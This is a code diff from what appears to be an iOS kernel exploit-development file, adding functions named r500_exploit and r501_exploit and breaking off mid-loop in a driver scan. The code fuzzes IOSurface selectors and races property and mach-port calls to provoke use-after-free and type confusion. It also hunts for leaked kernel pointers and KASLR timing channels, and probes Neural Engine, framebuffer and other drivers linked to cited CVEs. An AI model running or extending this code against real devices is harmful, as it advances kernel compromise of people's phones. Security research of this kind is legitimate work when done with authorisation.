@@ -27735,12 +27735,14 @@ static void r499_exploit(void) {
  * Phase 3: IOSurface sel 19 as kernel heap primitive
  * ==================================================================== */
 
-static void r500_exploit(void) {
-    rlog("\n=== r500: sel19 deep probe + MaxQP=0 extra-byte analysis ===\n\n");
-    fflush(stdout);
+static void r501_exploit(void) {
+    rlog("\n=== r501: STUB — property race being written ===\n");
+    rlog("  Use rounds=504 for r500 sel19 probe instead\n");
+}
 
-    /* Phase 1: Deep probe IOSurface selector 19 */
-    rlog("--- Phase 1: IOSurface sel 19 deep probe ---\n");
+static void r500_exploit(void) {
+    rlog("\n=== r500: comprehensive selector map + sel19 probe + MaxQP=0 ===\n\n");
+    fflush(stdout);
 
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
         IOServiceMatching("IOSurfaceRoot"));
@@ -27749,6 +27751,9 @@ static void r500_exploit(void) {
     IOObjectRelease(svc);
     rlog("  conn=0x%x kr=0x%x\n", conn, kr);
     if (kr != 0) goto r500_done;
+
+    /* Phase 0: Comprehensive selector map — test ALL selectors 0-52 */
+    rlog("--- Phase 0: IOSurface selector map (0-52) ---\n");
 
     /* Create a surface */
     CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
@@ -27769,6 +27774,106 @@ static void r500_exploit(void) {
     CFRelease(bn); CFRelease(brn); CFRelease(pfn);
     uint32_t sid = IOSurfaceGetID(surf);
     rlog("  Surface id=%u\n", sid);
+
+    {
+        int accessible_count = 0, restricted_count = 0;
+        rlog("  Selector sweep (0-52):\n");
+        for (int sel = 0; sel <= 52; sel++) {
+            uint64_t si[6] = {sid, 0, 0, 0, 0, 0};
+            uint64_t so[6] = {0};
+            uint32_t so_cnt = 6;
+            uint8_t struct_in[64] = {0};
+            uint8_t struct_out[256] = {0};
+            size_t struct_out_sz = 256;
+            memcpy(struct_in, &sid, 4);
+
+            /* Try: 1 scalar in, struct out */
+            kr = IOConnectCallMethod(conn, sel, si, 1, NULL, 0,
+                so, &so_cnt, struct_out, &struct_out_sz);
+
+            char tag = ' ';
+            if (kr == 0) { tag = '+'; accessible_count++; }
+            else if (kr == 0xe00002c2) { tag = 'X'; restricted_count++; }
+
+            rlog("    [%c] sel %2d: kr=0x%08x", tag, sel, kr);
+            if (kr == 0) {
+                rlog(" so_cnt=%u ss=%zu", so_cnt, struct_out_sz);
+                /* Check for kernel pointers in output */
+                for (uint32_t i = 0; i < so_cnt; i++) {
+                    if ((so[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog(" *** KPTR so[%d]=0x%llx ***", i, (unsigned long long)so[i]);
+                }
+                for (size_t i = 0; i + 7 < struct_out_sz; i += 8) {
+                    uint64_t qw = *(uint64_t*)(struct_out + i);
+                    if ((qw & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog(" *** KPTR +%zu=0x%llx ***", i, (unsigned long long)qw);
+                }
+            }
+            rlog("\n");
+
+            /* Reset for next */
+            so_cnt = 6;
+            struct_out_sz = 256;
+            memset(so, 0, sizeof(so));
+            memset(struct_out, 0, sizeof(struct_out));
+        }
+        rlog("  Summary: %d accessible, %d restricted, %d other\n",
+             accessible_count, restricted_count, 53 - accessible_count - restricted_count);
+    }
+
+    /* Phase 0b: Test framework-level property APIs */
+    rlog("\n--- Phase 0b: Framework-level property API test ---\n");
+    {
+        /* SetValue */
+        uint8_t testdata[64];
+        memset(testdata, 0x42, 64);
+        CFDataRef dat = CFDataCreate(NULL, testdata, 64);
+        IOSurfaceSetValue(surf, CFSTR("testkey"), dat);
+        CFRelease(dat);
+        rlog("  SetValue(testkey, 64B CFData): done\n");
+
+        /* CopyValue */
+        CFTypeRef val = IOSurfaceCopyValue(surf, CFSTR("testkey"));
+        if (val) {
+            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                CFDataRef d = (CFDataRef)val;
+                rlog("  CopyValue(testkey): CFData %ldB\n", (long)CFDataGetLength(d));
+                const uint8_t *bytes = CFDataGetBytePtr(d);
+                /* Check for corruption */
+                int corrupted = 0;
+                for (int i = 0; i < CFDataGetLength(d) && i < 64; i++) {
+                    if (bytes[i] != 0x42) { corrupted++; }
+                }
+                rlog("  Corruption check: %d bytes differ from 0x42\n", corrupted);
+            } else {
+                rlog("  CopyValue(testkey): type=%lu (not CFData)\n",
+                     (unsigned long)CFGetTypeID(val));
+            }
+            CFRelease(val);
+        } else {
+            rlog("  CopyValue(testkey): NULL\n");
+        }
+
+        /* RemoveValue */
+        IOSurfaceRemoveValue(surf, CFSTR("testkey"));
+        val = IOSurfaceCopyValue(surf, CFSTR("testkey"));
+        rlog("  RemoveValue + CopyValue: %s\n", val ? "STILL EXISTS" : "gone (correct)");
+        if (val) CFRelease(val);
+
+        /* Mach port roundtrip */
+        mach_port_t mp = IOSurfaceCreateMachPort(surf);
+        rlog("  CreateMachPort: port=0x%x\n", mp);
+        if (mp != MACH_PORT_NULL) {
+            IOSurfaceRef surf2 = IOSurfaceLookupFromMachPort(mp);
+            rlog("  LookupFromMachPort: surf=%p id=%u\n",
+                 (void*)surf2, surf2 ? IOSurfaceGetID(surf2) : 0);
+            if (surf2) CFRelease(surf2);
+            mach_port_deallocate(mach_task_self(), mp);
+        }
+    }
+
+    /* Phase 1: Deep probe IOSurface selector 19 */
+    rlog("\n--- Phase 1: IOSurface sel 19 deep probe ---\n");
 
     /* 1a: sel19 with different struct sizes */
     rlog("\n  1a: sel19 struct size sweep:\n");
@@ -28080,6 +28185,638 @@ static void r500_exploit(void) {
 
 r500_done:
     rlog("\n=== r500 complete ===\n");
+    fflush(stdout);
+}
+
+/* ====================================================================
+ * r501: Multi-vector attack surface probe
+ *
+ * After r499 confirmed IOSurface sel 17/18 are entitlement-gated, and r500
+ * probed sel 19, we pivot to new attack surfaces:
+ *
+ * Phase 1: IOSurface property store race (SetValue/RemoveValue/CopyValue)
+ *          These use low selectors (9/10) accessible without entitlements.
+ *          Race condition between concurrent set/remove/copy on same key.
+ * Phase 2: IOSurface mach port race (CreateMachPort / LookupFromMachPort)
+ *          Race between create and lookup on same surface.
+ * Phase 3: Neural Engine (ANE) driver probe
+ *          CVE-2026-84494: ANE OOB write, fixed in 27.2 with bounds check.
+ *          Probe if ANE IOKit is accessible without entitlements.
+ * Phase 4: IOMobileFrameBuffer probe
+ *          CVE-2026-112459: Race condition in IOMFB. Probe accessibility.
+ * Phase 5: KASLR leak hunt via IOSurface property timing + mach timing
+ *          CVE-2026-112665: "app may determine kernel memory layout"
+ *          Fixed with "improved state management" - probe timing channels.
+ * Phase 6: Broad IOKit driver accessibility scan
+ *          Find which drivers we can open without entitlements.
+ * ==================================================================== */
+
+static void r501_exploit(void) {
+    rlog("\n=== r501: Multi-vector attack surface probe ===\n\n");
+    fflush(stdout);
+
+    /* ===== Phase 1: IOSurface property store race ===== */
+    rlog("--- Phase 1: IOSurface property store race ---\n");
+    rlog("  Racing SetValue/RemoveValue/CopyValue on same key\n");
+
+    CFMutableDictionaryRef p1_props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int p1w = 64, p1h = 64, p1bpe = 4, p1bpr = 256, p1pf = 0x42475241;
+    CFNumberRef p1wn = CFNumberCreate(NULL, kCFNumberIntType, &p1w);
+    CFNumberRef p1hn = CFNumberCreate(NULL, kCFNumberIntType, &p1h);
+    CFNumberRef p1bn = CFNumberCreate(NULL, kCFNumberIntType, &p1bpe);
+    CFNumberRef p1brn = CFNumberCreate(NULL, kCFNumberIntType, &p1bpr);
+    CFNumberRef p1pfn = CFNumberCreate(NULL, kCFNumberIntType, &p1pf);
+    CFDictionarySetValue(p1_props, CFSTR("IOSurfaceWidth"), p1wn);
+    CFDictionarySetValue(p1_props, CFSTR("IOSurfaceHeight"), p1hn);
+    CFDictionarySetValue(p1_props, CFSTR("IOSurfaceBytesPerElement"), p1bn);
+    CFDictionarySetValue(p1_props, CFSTR("IOSurfaceBytesPerRow"), p1brn);
+    CFDictionarySetValue(p1_props, CFSTR("IOSurfacePixelFormat"), p1pfn);
+
+    _Atomic int p1_anomalies = 0;
+    _Atomic int p1_crashes = 0;
+    _Atomic int p1_kptrs = 0;
+    _Atomic int p1_type_confusion = 0;
+
+    #define P1_RACE_ROUNDS 2000
+    #define P1_NTHREADS 4
+    #define P1_NSURFACES 8
+
+    IOSurfaceRef p1_surfs[P1_NSURFACES];
+    for (int i = 0; i < P1_NSURFACES; i++) {
+        p1_surfs[i] = IOSurfaceCreate(p1_props);
+        if (!p1_surfs[i]) { rlog("  WARN: surf %d failed\n", i); }
+    }
+
+    volatile int p1_go = 0;
+    volatile int p1_stop = 0;
+
+    /* Writer thread: rapidly set values on the surface */
+    dispatch_queue_t p1_wq = dispatch_queue_create("p1.writer", DISPATCH_QUEUE_CONCURRENT);
+    dispatch_queue_t p1_rq = dispatch_queue_create("p1.reader", DISPATCH_QUEUE_CONCURRENT);
+
+    for (int t = 0; t < P1_NTHREADS; t++) {
+        dispatch_async(p1_wq, ^{
+            while (!p1_go) usleep(1);
+            for (int r = 0; r < P1_RACE_ROUNDS && !p1_stop; r++) {
+                int si = r % P1_NSURFACES;
+                if (!p1_surfs[si]) continue;
+
+                /* Create data of varying sizes to trigger different kalloc zones */
+                int sz = 16 + (r % 256);
+                uint8_t *data = malloc(sz);
+                memset(data, (uint8_t)(r & 0xFF), sz);
+                /* Plant a sentinel at the start */
+                uint64_t sentinel = 0xAAAA000000000000ULL | r;
+                if (sz >= 8) memcpy(data, &sentinel, 8);
+
+                CFDataRef val = CFDataCreate(NULL, data, sz);
+                IOSurfaceSetValue(p1_surfs[si], CFSTR("_race_key"), val);
+                CFRelease(val);
+                free(data);
+
+                /* Immediately remove it */
+                IOSurfaceRemoveValue(p1_surfs[si], CFSTR("_race_key"));
+            }
+        });
+    }
+
+    /* Reader threads: try to read values concurrently */
+    for (int t = 0; t < P1_NTHREADS; t++) {
+        dispatch_async(p1_rq, ^{
+            while (!p1_go) usleep(1);
+            for (int r = 0; r < P1_RACE_ROUNDS && !p1_stop; r++) {
+                int si = r % P1_NSURFACES;
+                if (!p1_surfs[si]) continue;
+
+                CFTypeRef val = IOSurfaceCopyValue(p1_surfs[si], CFSTR("_race_key"));
+                if (val) {
+                    CFTypeID tid = CFGetTypeID(val);
+                    if (tid != CFDataGetTypeID()) {
+                        p1_type_confusion++;
+                        rlog("  *** TYPE CONFUSION: got typeID=%lu expected CFData ***\n",
+                             (unsigned long)tid);
+                    } else {
+                        CFDataRef d = (CFDataRef)val;
+                        CFIndex len = CFDataGetLength(d);
+                        const uint8_t *ptr = CFDataGetBytePtr(d);
+                        /* Check for kernel pointers in the data */
+                        for (CFIndex j = 0; j + 7 < len; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, ptr + j, 8);
+                            if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                                p1_kptrs++;
+                                rlog("  *** KPTR in property: off=%d val=0x%llx len=%d ***\n",
+                                     (int)j, (unsigned long long)v, (int)len);
+                            }
+                        }
+                        /* Check for unexpected size changes */
+                        if (len < 16 || len > 300) {
+                            p1_anomalies++;
+                        }
+                    }
+                    CFRelease(val);
+                }
+            }
+        });
+    }
+
+    p1_go = 1;
+    dispatch_barrier_sync(p1_wq, ^{});
+    dispatch_barrier_sync(p1_rq, ^{});
+    p1_stop = 1;
+
+    rlog("  Results: anomalies=%d type_confusion=%d kptrs=%d\n",
+         (int)p1_anomalies, (int)p1_type_confusion, (int)p1_kptrs);
+
+    /* Phase 1b: Race with different value types (dict vs data vs string) */
+    rlog("\n  Phase 1b: Mixed-type property race\n");
+    _Atomic int p1b_type_mismatch = 0;
+    _Atomic int p1b_kptrs = 0;
+    volatile int p1b_go = 0;
+    volatile int p1b_stop = 0;
+
+    for (int t = 0; t < 2; t++) {
+        dispatch_async(p1_wq, ^{
+            while (!p1b_go) usleep(1);
+            IOSurfaceRef s = p1_surfs[0];
+            if (!s) return;
+            for (int r = 0; r < P1_RACE_ROUNDS && !p1b_stop; r++) {
+                if (r & 1) {
+                    /* Set as CFData */
+                    uint8_t buf[32];
+                    memset(buf, 0x42, 32);
+                    CFDataRef d = CFDataCreate(NULL, buf, 32);
+                    IOSurfaceSetValue(s, CFSTR("_mixrace"), d);
+                    CFRelease(d);
+                } else {
+                    /* Set as CFDictionary */
+                    CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int v = r;
+                    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &v);
+                    CFDictionarySetValue(d, CFSTR("k"), n);
+                    CFRelease(n);
+                    IOSurfaceSetValue(s, CFSTR("_mixrace"), (CFTypeRef)d);
+                    CFRelease(d);
+                }
+                IOSurfaceRemoveValue(s, CFSTR("_mixrace"));
+            }
+        });
+    }
+
+    for (int t = 0; t < 2; t++) {
+        dispatch_async(p1_rq, ^{
+            while (!p1b_go) usleep(1);
+            IOSurfaceRef s = p1_surfs[0];
+            if (!s) return;
+            for (int r = 0; r < P1_RACE_ROUNDS && !p1b_stop; r++) {
+                CFTypeRef val = IOSurfaceCopyValue(s, CFSTR("_mixrace"));
+                if (val) {
+                    CFTypeID tid = CFGetTypeID(val);
+                    if (tid == CFDataGetTypeID()) {
+                        CFDataRef d = (CFDataRef)val;
+                        const uint8_t *p = CFDataGetBytePtr(d);
+                        CFIndex len = CFDataGetLength(d);
+                        for (CFIndex j = 0; j + 7 < len; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, p + j, 8);
+                            if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                                p1b_kptrs++;
+                                rlog("  *** KPTR mixed race: 0x%llx ***\n",
+                                     (unsigned long long)v);
+                            }
+                        }
+                    } else if (tid == CFDictionaryGetTypeID()) {
+                        /* Expected */
+                    } else {
+                        p1b_type_mismatch++;
+                        rlog("  *** UNEXPECTED TYPE: id=%lu ***\n", (unsigned long)tid);
+                    }
+                    CFRelease(val);
+                }
+            }
+        });
+    }
+
+    p1b_go = 1;
+    dispatch_barrier_sync(p1_wq, ^{});
+    dispatch_barrier_sync(p1_rq, ^{});
+    p1b_stop = 1;
+
+    rlog("  Phase 1b results: type_mismatch=%d kptrs=%d\n",
+         (int)p1b_type_mismatch, (int)p1b_kptrs);
+
+    for (int i = 0; i < P1_NSURFACES; i++)
+        if (p1_surfs[i]) CFRelease(p1_surfs[i]);
+    CFRelease(p1_props); CFRelease(p1wn); CFRelease(p1hn);
+    CFRelease(p1bn); CFRelease(p1brn); CFRelease(p1pfn);
+    fflush(stdout);
+
+    /* ===== Phase 2: IOSurface mach port race ===== */
+    rlog("\n--- Phase 2: IOSurface mach port race ---\n");
+    rlog("  Racing CreateMachPort / LookupFromMachPort / Destroy\n");
+
+    CFMutableDictionaryRef p2_props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int p2v = 64;
+    CFNumberRef p2n = CFNumberCreate(NULL, kCFNumberIntType, &p2v);
+    CFDictionarySetValue(p2_props, CFSTR("IOSurfaceWidth"), p2n);
+    CFDictionarySetValue(p2_props, CFSTR("IOSurfaceHeight"), p2n);
+    p2v = 4;
+    CFNumberRef p2bn = CFNumberCreate(NULL, kCFNumberIntType, &p2v);
+    CFDictionarySetValue(p2_props, CFSTR("IOSurfaceBytesPerElement"), p2bn);
+    p2v = 256;
+    CFNumberRef p2brn = CFNumberCreate(NULL, kCFNumberIntType, &p2v);
+    CFDictionarySetValue(p2_props, CFSTR("IOSurfaceBytesPerRow"), p2brn);
+    p2v = 0x42475241;
+    CFNumberRef p2pfn = CFNumberCreate(NULL, kCFNumberIntType, &p2v);
+    CFDictionarySetValue(p2_props, CFSTR("IOSurfacePixelFormat"), p2pfn);
+
+    #define P2_ROUNDS 500
+    _Atomic int p2_uaf_hits = 0;
+    _Atomic int p2_double_lookup = 0;
+    _Atomic int p2_null_after_create = 0;
+
+    for (int round = 0; round < P2_ROUNDS; round++) {
+        IOSurfaceRef s = IOSurfaceCreate(p2_props);
+        if (!s) continue;
+
+        mach_port_t mp = IOSurfaceCreateMachPort(s);
+        if (mp == MACH_PORT_NULL) { CFRelease(s); continue; }
+
+        /* Race: lookup from mach port while destroying the surface */
+        volatile int p2_go = 0;
+        __block IOSurfaceRef looked_up = NULL;
+        __block int lookup_ok = 0;
+
+        dispatch_queue_t dq = dispatch_queue_create("p2race", NULL);
+        dispatch_async(dq, ^{
+            while (!p2_go) ;
+            looked_up = IOSurfaceLookupFromMachPort(mp);
+            if (looked_up) lookup_ok = 1;
+        });
+
+        /* Tiny delay then destroy */
+        p2_go = 1;
+        CFRelease(s);
+
+        dispatch_sync(dq, ^{});
+
+        if (looked_up) {
+            /* We got a reference after the original was released */
+            uint32_t lid = IOSurfaceGetID(looked_up);
+            void *base = IOSurfaceGetBaseAddress(looked_up);
+            if (base) {
+                IOSurfaceLock(looked_up, kIOSurfaceLockReadOnly, NULL);
+                uint64_t v;
+                memcpy(&v, base, 8);
+                IOSurfaceUnlock(looked_up, kIOSurfaceLockReadOnly, NULL);
+                if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                    p2_uaf_hits++;
+                    rlog("  *** UAF KPTR: id=%u val=0x%llx ***\n",
+                         lid, (unsigned long long)v);
+                }
+            }
+            /* Try double lookup */
+            IOSurfaceRef s2 = IOSurfaceLookupFromMachPort(mp);
+            if (s2 && s2 != looked_up) {
+                p2_double_lookup++;
+                rlog("  *** DOUBLE LOOKUP: different refs! ***\n");
+                CFRelease(s2);
+            } else if (s2) {
+                CFRelease(s2);
+            }
+            CFRelease(looked_up);
+        } else {
+            p2_null_after_create++;
+        }
+
+        mach_port_deallocate(mach_task_self(), mp);
+    }
+
+    rlog("  Results: uaf_hits=%d double_lookup=%d null=%d/%d\n",
+         (int)p2_uaf_hits, (int)p2_double_lookup, (int)p2_null_after_create, P2_ROUNDS);
+
+    CFRelease(p2_props); CFRelease(p2n); CFRelease(p2bn);
+    CFRelease(p2brn); CFRelease(p2pfn);
+    fflush(stdout);
+
+    /* ===== Phase 3: Neural Engine (ANE) driver probe ===== */
+    rlog("\n--- Phase 3: Neural Engine driver probe ---\n");
+    rlog("  CVE-2026-84494: ANE OOB write (fixed 27.2)\n");
+
+    const char *ane_names[] = {
+        "AppleH16ANEIn",
+        "AppleNeuralEngine",
+        "H16ANEIn",
+        "ANECompilerService",
+        "AppleH15ANEIn",
+        "AppleH14ANEIn",
+        "AppleANE",
+        "AppleH16ANE",
+        NULL
+    };
+
+    io_connect_t ane_conn = 0;
+    io_service_t ane_svc = 0;
+    const char *ane_found = NULL;
+
+    for (int i = 0; ane_names[i]; i++) {
+        ane_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching(ane_names[i]));
+        if (ane_svc) {
+            rlog("  Found: %s (svc=0x%x)\n", ane_names[i], ane_svc);
+            /* Try connection types 0-4 */
+            for (int ct = 0; ct <= 4; ct++) {
+                kern_return_t kr = IOServiceOpen(ane_svc, mach_task_self(), ct, &ane_conn);
+                rlog("    type=%d: kr=0x%x conn=0x%x\n", ct, kr, ane_conn);
+                if (kr == KERN_SUCCESS && ane_conn) {
+                    ane_found = ane_names[i];
+                    /* Probe selectors 0-20 */
+                    rlog("    Probing selectors 0-20:\n");
+                    for (int sel = 0; sel <= 20; sel++) {
+                        uint64_t sin[4] = {0, 0, 0, 0};
+                        uint32_t soc = 4;
+                        uint64_t sout[4] = {0};
+                        uint8_t sbuf[64] = {0};
+                        size_t sbuf_sz = 64;
+                        kr = IOConnectCallMethod(ane_conn, sel,
+                            sin, 1, NULL, 0, sout, &soc, sbuf, &sbuf_sz);
+                        rlog("      sel%d: kr=0x%x", sel, kr);
+                        if (kr == KERN_SUCCESS) {
+                            rlog(" sout={0x%llx} sbuf_sz=%zu",
+                                 (unsigned long long)sout[0], sbuf_sz);
+                            /* Check output for kernel pointers */
+                            for (int j = 0; j + 7 < (int)sbuf_sz; j += 4) {
+                                uint64_t v;
+                                memcpy(&v, sbuf + j, 8);
+                                if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                                    rlog(" ***KPTR@%d=0x%llx***", j, (unsigned long long)v);
+                                }
+                            }
+                        }
+                        rlog("\n");
+                    }
+                    IOServiceClose(ane_conn);
+                    ane_conn = 0;
+                }
+            }
+            IOObjectRelease(ane_svc);
+            ane_svc = 0;
+        }
+    }
+    if (!ane_found) rlog("  No accessible ANE driver found\n");
+    fflush(stdout);
+
+    /* ===== Phase 4: IOMobileFrameBuffer probe ===== */
+    rlog("\n--- Phase 4: IOMobileFrameBuffer probe ---\n");
+    rlog("  CVE-2026-112459: IOMFB race condition (fixed 27.2)\n");
+
+    const char *fb_names[] = {
+        "IOMobileFramebuffer",
+        "IOFramebuffer",
+        "AppleCLCD",
+        "AppleDisplayController",
+        "IOMFBDisplay",
+        "AppleH16Display",
+        NULL
+    };
+
+    for (int i = 0; fb_names[i]; i++) {
+        io_service_t fb_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching(fb_names[i]));
+        if (fb_svc) {
+            rlog("  Found: %s (svc=0x%x)\n", fb_names[i], fb_svc);
+            for (int ct = 0; ct <= 4; ct++) {
+                io_connect_t fb_conn = 0;
+                kern_return_t kr = IOServiceOpen(fb_svc, mach_task_self(), ct, &fb_conn);
+                rlog("    type=%d: kr=0x%x conn=0x%x\n", ct, kr, fb_conn);
+                if (kr == KERN_SUCCESS && fb_conn) {
+                    rlog("    *** ACCESSIBLE! Probing selectors 0-30:\n");
+                    for (int sel = 0; sel <= 30; sel++) {
+                        uint64_t sin[4] = {0};
+                        uint32_t soc = 4;
+                        uint64_t sout[4] = {0};
+                        kr = IOConnectCallMethod(fb_conn, sel,
+                            sin, 0, NULL, 0, sout, &soc, NULL, NULL);
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            rlog("      sel%d: kr=0x%x sout={0x%llx,0x%llx}\n",
+                                 sel, kr,
+                                 (unsigned long long)sout[0],
+                                 (unsigned long long)sout[1]);
+                        }
+                    }
+                    IOServiceClose(fb_conn);
+                }
+            }
+            IOObjectRelease(fb_svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ===== Phase 5: KASLR leak hunt ===== */
+    rlog("\n--- Phase 5: KASLR leak via state/timing channels ---\n");
+    rlog("  CVE-2026-112665: kernel memory layout leak (fixed 27.2)\n");
+
+    /* 5a: Check IOSurface surface IDs for sequential pattern break */
+    rlog("\n  5a: Surface ID sequence analysis:\n");
+    {
+        uint32_t ids[32];
+        IOSurfaceRef ss[32];
+        for (int i = 0; i < 32; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int v = 32;
+            CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), n);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), n);
+            v = 4; CFNumberRef n2 = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), n2);
+            v = 128; CFNumberRef n3 = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), n3);
+            v = 0x42475241; CFNumberRef n4 = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), n4);
+            ss[i] = IOSurfaceCreate(sp);
+            ids[i] = ss[i] ? IOSurfaceGetID(ss[i]) : 0;
+            CFRelease(sp); CFRelease(n); CFRelease(n2); CFRelease(n3); CFRelease(n4);
+        }
+        rlog("  IDs:");
+        for (int i = 0; i < 32; i++) rlog(" %u", ids[i]);
+        rlog("\n  Deltas:");
+        for (int i = 1; i < 32; i++) rlog(" %d", (int)(ids[i] - ids[i-1]));
+        rlog("\n");
+        for (int i = 0; i < 32; i++) if (ss[i]) CFRelease(ss[i]);
+    }
+
+    /* 5b: Mach port name analysis (port names can leak KASLR on some versions) */
+    rlog("\n  5b: Mach port name analysis:\n");
+    {
+        mach_port_t ports[32];
+        for (int i = 0; i < 32; i++) {
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+        }
+        rlog("  Port names:");
+        for (int i = 0; i < 32; i++) rlog(" 0x%x", ports[i]);
+        rlog("\n  Deltas:");
+        for (int i = 1; i < 32; i++) rlog(" 0x%x", ports[i] - ports[i-1]);
+        rlog("\n");
+        /* Check high bits for leaked address fragments */
+        for (int i = 0; i < 32; i++) {
+            if (ports[i] > 0x10000 && (ports[i] & 0xFFF) != 0x03 &&
+                (ports[i] & 0xFFF) != 0x07 && (ports[i] & 0xFFF) != 0x0b) {
+                rlog("  *** Unusual port name: 0x%x ***\n", ports[i]);
+            }
+            mach_port_deallocate(mach_task_self(), ports[i]);
+        }
+    }
+
+    /* 5c: mach_absolute_time analysis for timing side-channel */
+    rlog("\n  5c: Timing channel probes:\n");
+    {
+        /* Time a syscall and look for KASLR-dependent timing */
+        uint64_t times[64];
+        for (int i = 0; i < 64; i++) {
+            uint64_t t0 = mach_absolute_time();
+            /* Do a kernel-touching operation */
+            mach_port_t tmp;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tmp);
+            mach_port_deallocate(mach_task_self(), tmp);
+            uint64_t t1 = mach_absolute_time();
+            times[i] = t1 - t0;
+        }
+        uint64_t sum = 0, min_t = UINT64_MAX, max_t = 0;
+        for (int i = 0; i < 64; i++) {
+            sum += times[i];
+            if (times[i] < min_t) min_t = times[i];
+            if (times[i] > max_t) max_t = times[i];
+        }
+        rlog("  Port alloc/dealloc timing: avg=%llu min=%llu max=%llu spread=%llu\n",
+             (unsigned long long)(sum/64), (unsigned long long)min_t,
+             (unsigned long long)max_t, (unsigned long long)(max_t - min_t));
+    }
+
+    /* 5d: host_statistics for memory pressure info (may leak layout) */
+    rlog("\n  5d: Host statistics probe:\n");
+    {
+        vm_statistics64_data_t vmstat;
+        mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
+        kern_return_t kr = host_statistics64(mach_host_self(),
+            HOST_VM_INFO64, (host_info64_t)&vmstat, &count);
+        if (kr == KERN_SUCCESS) {
+            rlog("  free=%llu active=%llu inactive=%llu wired=%llu\n",
+                 (unsigned long long)vmstat.free_count,
+                 (unsigned long long)vmstat.active_count,
+                 (unsigned long long)vmstat.inactive_count,
+                 (unsigned long long)vmstat.wire_count);
+            rlog("  pageins=%llu pageouts=%llu faults=%llu\n",
+                 (unsigned long long)vmstat.pageins,
+                 (unsigned long long)vmstat.pageouts,
+                 (unsigned long long)vmstat.faults);
+            /* Look for suspiciously large or pointer-like values */
+            uint64_t *vp = (uint64_t *)&vmstat;
+            for (int i = 0; i < (int)(sizeof(vmstat)/8); i++) {
+                if ((vp[i] >> 36) == 0xfffffff || (vp[i] >> 36) == 0xfffffffe) {
+                    rlog("  *** KPTR in vmstat field %d: 0x%llx ***\n",
+                         i, (unsigned long long)vp[i]);
+                }
+            }
+        } else {
+            rlog("  host_statistics64: kr=0x%x\n", kr);
+        }
+
+        /* task_info for memory layout */
+        struct task_basic_info_64 tbi;
+        mach_msg_type_number_t tbi_cnt = TASK_BASIC_INFO_64_COUNT;
+        kr = task_info(mach_task_self(), TASK_BASIC_INFO_64,
+            (task_info_t)&tbi, &tbi_cnt);
+        if (kr == KERN_SUCCESS) {
+            rlog("  task: vsize=0x%llx rss=0x%llx\n",
+                 (unsigned long long)tbi.virtual_size,
+                 (unsigned long long)tbi.resident_size);
+        }
+
+        /* thread_info */
+        thread_basic_info_data_t thbi;
+        mach_msg_type_number_t thbi_cnt = THREAD_BASIC_INFO_COUNT;
+        kr = thread_info(mach_thread_self(), THREAD_BASIC_INFO,
+            (thread_info_t)&thbi, &thbi_cnt);
+        rlog("  thread_info: kr=0x%x\n", kr);
+    }
+    fflush(stdout);
+
+    /* ===== Phase 6: Broad IOKit driver accessibility scan ===== */
+    rlog("\n--- Phase 6: IOKit driver accessibility scan ---\n");
+
+    const char *drivers[] = {
+        "IOSurfaceRoot",
+        "AppleAVE2Driver",
+        "AppleJPEGDriver",
+        "IOHIDSystem",
+        "IOHIDEventSystem",
+        "IOHIDEventService",
+        "AppleKeyStore",
+        "IOUserEthernetController",
+        "IOAudioEngine",
+        "AppleSPU",
+        "AppleDCP",
+        "AppleDisplay",
+        "AGXAccelerator",
+        "AGXG16G",
+        "AGXFamilyAccelerator",
+        "IOAccelerator",
+        "AppleSEPManager",
+        "AppleCredentialManager",
+        "IOStreamUserClient",
+        "AppleUSBDevice",
+        "AppleBCMWLANChip",
+        "AppleSynapse",
+        "CoreAnalyticsHub",
+        "IOReportHub",
+        "AppleEmbeddedTempSensor",
+        "ApplePMGR",
+        "AppleARMPMU",
+        "AppleSMC",
+        "AppleEffaceableStorage",
+        "IOTimeSyncClockManager",
+        NULL
+    };
+
+    rlog("  Driver accessibility (type 0):\n");
+    for (int i = 0; drivers[i]; i++) {
+        io_service_t dsvc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching(drivers[i]));
+        if (!dsvc) continue;
+
+        io_connect_t dc = 0;
+        kern_return_t kr = IOServiceOpen(dsvc, mach_task_self(), 0, &dc);
+        char status[32] = "not-found";
+        if (kr == KERN_SUCCESS && dc) {
